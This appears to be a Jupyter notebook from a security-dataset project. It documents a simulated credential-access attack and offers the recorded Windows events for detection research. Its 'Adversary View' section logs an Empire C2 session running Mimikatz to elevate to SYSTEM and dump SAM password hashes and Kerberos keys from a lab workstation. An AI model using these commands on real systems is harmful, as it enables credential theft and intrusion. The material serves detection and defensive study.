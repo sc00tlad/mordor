{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "10802ce4",
   "metadata": {},
   "source": [
    "# Empire Mimikatz SAM Extract Hashes"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2866916f",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9795aff9",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/06/25 |\n",
    "| Modification Date | 2019/09/22 |\n",
    "| Tactics           | [TA0006](https://attack.mitre.org/tactics/TA0006) |\n",
    "| Techniques        | [T1003.002](https://attack.mitre.org/techniques/T1003/002) |\n",
    "| Tags              | Calculating SysKey,SAM Read,SAM Handle Request |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "10d2adbe",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries calculating the SysKey to decrypt Security Account Mannager (SAM) database entries (from registry or hive) and get NTLM, and sometimes LM hashes of local accounts password."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4094edf9",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4859966f",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_sam_access.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_sam_access.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4d8e903f",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2ff4a873",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ea756dab",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [mimikatz_sam](https://github.com/OTRF/Blacksmith/blob/master/aws/Security-Datasets/cfn-files/scripts/Invoke-Mimikatz.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9eaac6ce",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: WE8XYD3K) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "WE8XYD3K ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5972   5/0.0    2020-09-22 08:05:18  http            \n",
    "\n",
    "(Empire: agents) > interact WE8XYD3K\n",
    "(Empire: WE8XYD3K) > usemodule credentials/mimikatz/sam*\n",
    "(Empire: powershell/credentials/mimikatz/sam) > info\n",
    "\n",
    "              Name: Invoke-Mimikatz SAM dump\n",
    "            Module: powershell/credentials/mimikatz/sam\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @JosephBialek\n",
    "  @gentilkiwi\n",
    "\n",
    "Description:\n",
    "  Runs PowerSploit's Invoke-Mimikatz function to extract\n",
    "  hashes from the Security Account Managers (SAM) database.\n",
    "\n",
    "Comments:\n",
    "  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com htt\n",
    "  ps://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#ls\n",
    "  a\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name  Required    Value                     Description\n",
    "  ----  --------    -------                   -----------\n",
    "  Agent True        WE8XYD3K                  Agent to run module on.                 \n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/sam) > execute\n",
    "[*] Tasked WE8XYD3K to run TASK_CMD_JOB\n",
    "[*] Agent WE8XYD3K tasked with task ID 3\n",
    "[*] Tasked agent WE8XYD3K to run module powershell/credentials/mimikatz/sam\n",
    "(Empire: powershell/credentials/mimikatz/sam) > \n",
    "Job started: Z4KLXY\n",
    "\n",
    "Hostname: WORKSTATION5.theshire.local / S-1-5-21-4228717743-1032521047-1810997296\n",
    "\n",
    "  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # token::elevate\n",
    "Token Id  : 0\n",
    "User name : \n",
    "SID name  : NT AUTHORITY\\SYSTEM\n",
    "\n",
    "696     {0;000003e7} 1 D 27257          NT AUTHORITY\\SYSTEM     S-1-5-18        (04g,21p)       Primary\n",
    "-> Impersonated !\n",
    "* Process Token : {0;0010a7df} 2 F 10859624    THESHIRE\\pgustavo       S-1-5-21-4228717743-1032521047-1810997296-1104  (17g,24p)       Primary\n",
    "* Thread Token  : {0;000003e7} 1 D 12272014    NT AUTHORITY\\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)\n",
    "\n",
    "mimikatz(powershell) # lsadump::sam\n",
    "Domain : WORKSTATION5\n",
    "SysKey : 8e84403d1d0dcb7cac8f92c438143741\n",
    "Local SID : S-1-5-21-2579707521-1384412784-3942915809\n",
    "\n",
    "SAMKey : 506df337a2681cb7e4c265d30250d55d\n",
    "\n",
    "RID  : 000001f4 (500)\n",
    "User : wardog\n",
    "  Hash NTLM: 42ddb2963bbe8f1c075fc869d3bce33e\n",
    "\n",
    "Supplemental Credentials:\n",
    "* Primary:NTLM-Strong-NTOWF *\n",
    "    Random Value : 85c5e007a00c6fb1c5adf026cf9dd42f\n",
    "\n",
    "* Primary:Kerberos-Newer-Keys *\n",
    "    Default Salt : WORKSTATION5Administrator\n",
    "    Default Iterations : 4096\n",
    "    Credentials\n",
    "      aes256_hmac       (4096) : d24867d975ac3fead7e604bc793bc32c42e4f599d0fd871cebca72444a9475a8\n",
    "      aes128_hmac       (4096) : d22a564882d258731c02684449a62b3c\n",
    "      des_cbc_md5       (4096) : ae58aed5d5cef143\n",
    "    OldCredentials\n",
    "      aes256_hmac       (4096) : e104dc2412faf5a1e65d1c10218130aa1d2d70d64bd103e36c6115d9f84c36c9\n",
    "      aes128_hmac       (4096) : eff1bddad41de0a68408261d362d1ad3\n",
    "      des_cbc_md5       (4096) : 15a8dc46a16e62bf\n",
    "\n",
    "* Packages *\n",
    "    NTLM-Strong-NTOWF\n",
    "\n",
    "* Primary:Kerberos *\n",
    "    Default Salt : WORKSTATION5Administrator\n",
    "    Credentials\n",
    "      des_cbc_md5       : ae58aed5d5cef143\n",
    "    OldCredentials\n",
    "      des_cbc_md5       : 15a8dc46a16e62bf\n",
    "\n",
    "RID  : 000001f5 (501)\n",
    "User : Guest\n",
    "\n",
    "RID  : 000001f7 (503)\n",
    "User : DefaultAccount\n",
    "\n",
    "mimikatz(powershell) # token::revert\n",
    "* Process Token : {0;0010a7df} 2 F 10859624    THESHIRE\\pgustavo       S-1-5-21-4228717743-1032521047-1810997296-1104  (17g,24p)       Primary\n",
    "* Thread Token  : no token\n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/sam) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b3794acf",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bece7c35",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3c4dbd2c",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_mimikatz_sam_access.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8f9445eb",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "500d38ed",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6ae8c041",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3812515e",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d3d995bc",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
